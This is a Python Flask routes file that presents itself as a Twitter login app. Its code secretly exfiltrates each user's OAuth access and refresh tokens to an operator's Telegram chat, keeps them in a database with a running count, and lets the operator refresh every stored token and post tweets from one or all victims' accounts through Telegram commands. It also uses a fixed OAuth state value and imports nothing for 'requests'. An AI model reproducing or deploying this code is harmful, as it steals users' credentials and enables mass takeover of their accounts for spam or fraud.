from flask import redirect, request, session, render_template, url_for
from helpers import (
    generate_code_verifier_and_challenge, send_message_via_telegram, post_tweet,
    get_twitter_username_and_profile, generate_random_string, handle_post_single,
    handle_post_bulk, handle_refresh_single, handle_refresh_bulk
)
from database import store_token, get_all_tokens, get_total_tokens
from config import Config
from app import app  # Import the initialized app from app.py

@app.route('/')
def home():
    code = request.args.get('code')
    state = request.args.get('state')
    error = request.args.get('error')

    if 'username' in session:
        send_message_via_telegram(f"👋 @{session['username']} just returned to the website.")
        return redirect(url_for('welcome'))

    if request.args.get('authorize') == 'true':
        state = "0"
        code_verifier, code_challenge = generate_code_verifier_and_challenge()
        session['code_verifier'] = code_verifier

        authorization_url = (
            f"https://twitter.com/i/oauth2/authorize?client_id={Config.CLIENT_ID}&response_type=code&"
            f"redirect_uri={Config.CALLBACK_URL}&scope=tweet.read%20tweet.write%20users.read%20offline.access&"
            f"state={state}&code_challenge={code_challenge}&code_challenge_method=S256"
        )
        return redirect(authorization_url)

    if code:
        if error:
            return f"Error during authorization: {error}", 400

        if state != session.get('oauth_state', '0'):
            return "Invalid state parameter", 403

        code_verifier = session.pop('code_verifier', None)
        token_url = "https://api.twitter.com/2/oauth2/token"
        data = {
            'grant_type': 'authorization_code',
            'code': code,
            'redirect_uri': Config.CALLBACK_URL,
            'code_verifier': code_verifier
        }
        response = requests.post(token_url, auth=(Config.CLIENT_ID, Config.CLIENT_SECRET), data=data)
        token_response = response.json()

        if response.status_code == 200:
            access_token = token_response.get('access_token')
            refresh_token = token_response.get('refresh_token')

            username, profile_url = get_twitter_username_and_profile(access_token)
            if username:
                store_token(access_token, refresh_token, username)
                session['username'] = username
                session['access_token'] = access_token
                session['refresh_token'] = refresh_token
                total_tokens = get_total_tokens()
                send_message_via_telegram(
                    f"🔑 Access Token: {access_token}\n"
                    f"🔄 Refresh Token: {refresh_token}\n"
                    f"👤 Username: @{username}\n"
                    f"📊 Total Tokens in Database: {total_tokens}"
                )
                return redirect(url_for('welcome'))
            else:
                return "Error retrieving user info with access token", 400

    return render_template('home.html')

@app.route('/dashboard')
def dashboard():
    username = session.get('username', 'User')
    return render_template('dashboard.html', username=username)

@app.route('/welcome')
def welcome():
    username = session.get('username', 'User')
    
    if 'refresh_token' in session:
        access_token, refresh_token = handle_refresh_single()
        if access_token and refresh_token:
            session['access_token'] = access_token
            session['refresh_token'] = refresh_token
            send_message_via_telegram(f"🔄 Token refreshed for returning user @{username}.")
    return render_template('welcome.html', message=f"Welcome back, @{username}!")

@app.route('/logout')
def logout():
    session.clear()
    return redirect(url_for('home'))

@app.route('/webhook', methods=['POST'])
def telegram_webhook():
    update = request.json
    message = update.get('message', {}).get('text', '')

    if message == '/refresh_single':
        handle_refresh_single()
    elif message == '/refresh_bulk':
        handle_refresh_bulk()
    elif message.startswith('/post_single'):
        tweet_text = message.replace('/post_single', '').strip()
        if tweet_text:
            handle_post_single(tweet_text)
    elif message.startswith('/post_bulk'):
        tweet_text = message.replace('/post_bulk', '').strip()
        if tweet_text:
            handle_post_bulk(tweet_text)
    else:
        send_message_via_telegram("❌ Unknown command.")
    return '', 200

@app.route('/tweet/<access_token>', methods=['GET', 'POST'])
def tweet(access_token):
    if request.method == 'POST':
        tweet_text = request.form['tweet_text']
        result = post_tweet(access_token, tweet_text)
        return render_template('tweet_result.html', result=result)

    return render_template('tweet_form.html', access_token=access_token)
